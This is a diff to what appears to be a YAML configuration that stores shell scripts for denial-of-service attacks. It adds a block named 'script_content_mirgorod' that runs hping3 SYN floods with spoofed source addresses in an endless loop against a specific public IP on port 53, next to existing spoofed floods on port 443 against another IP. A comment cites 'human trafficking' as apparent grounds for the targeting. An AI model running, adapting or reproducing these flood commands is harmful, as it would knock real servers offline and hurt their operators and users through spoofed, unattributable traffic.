@@ -80,13 +80,17 @@ script_content: |
           sudo hping3 -a 190.0.175.123 185.71.67.220 -S -d 120 --flood -p 443 -1 &
           sudo hping3 -a 190.0.175.163 185.71.67.220 -S -d 120 --flood -p 443 -1 &
 
-          # http
-          # sudo hping3 -a 190.0.175.180 195.64.183.233 -S -d 120 --flood -p 53 -0 &
-          # sudo hping3 -a 190.0.175.115 195.64.183.233 -S -d 120 --flood -p 53 -0 &
-          # sudo hping3 -a 190.0.175.111 195.64.183.233 -S -d 120 --flood -p 53 -0 &
-          # sudo hping3 -a 190.0.175.140 195.64.183.233 -S -d 120 --flood -p 53 -1 &
-          # sudo hping3 -a 190.0.175.123 195.64.183.233 -S -d 120 --flood -p 53 -1 &
-          # sudo hping3 -a 190.0.175.163 195.64.183.233 -S -d 120 --flood -p 53 -1 &
+script_content_mirgorod: |
+          # ping
+          while true; do
+          sleep 30
+            sudo hping3 -a 190.0.175.180 195.64.183.233 -S -d 120 --flood -p 53 -0
+            sudo hping3 -a 190.0.175.115 195.64.183.233 -S -d 120 --flood -p 53 -0
+            sudo hping3 -a 190.0.175.111 195.64.183.233 -S -d 120 --flood -p 53 -0
+            sudo hping3 -a 190.0.175.140 195.64.183.233 -S -d 120 --flood -p 53 -2
+            sudo hping3 -a 190.0.175.123 195.64.183.233 -S -d 120 --flood -p 53 -2
+            sudo hping3 -a 190.0.175.163 195.64.183.233 -S -d 120 --flood -p 53 -2
+          done
 
 script_content_sci: |
           # possible, to all ports on server. human trafficking.
